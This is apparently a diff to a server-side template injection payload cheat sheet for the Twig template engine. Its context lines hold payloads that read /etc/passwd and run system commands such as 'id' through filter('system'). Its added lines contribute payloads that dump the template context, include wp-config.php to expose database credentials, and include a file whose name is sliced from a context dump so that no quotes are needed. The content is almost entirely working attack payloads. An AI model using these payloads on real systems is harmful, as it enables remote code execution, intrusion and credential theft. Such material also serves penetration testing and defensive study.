@@ -775,6 +775,7 @@ Execute code using SSTI for Slim engine.
 {{7*7}}
 {{7*'7'}} would result in 49
 {{dump(app)}}
+{{dump(_context)}}
 {{app.request.server.all|join(',')}}
 ```
 
@@ -796,6 +797,7 @@ $output = $twig > render (
 
 ```python
 "{{'/etc/passwd'|file_excerpt(1,30)}}"@
+{{include("wp-config.php")}}
 ```
 
 ### Twig - Code execution
@@ -807,6 +809,12 @@ $output = $twig > render (
 {{['id']|filter('system')}}
 {{['cat\x20/etc/passwd']|filter('system')}}
 {{['cat$IFS/etc/passwd']|filter('system')}}
+```
+
+Example injecting values to avoid using quotes for the filename (specify via OFFSET and LENGTH where the payload FILENAME is)
+
+```python
+FILENAME{% set var = dump(_context)[OFFSET:LENGTH] %} {{ include(var) }}
 ```
 
 Example with an email passing FILTER_VALIDATE_EMAIL PHP.
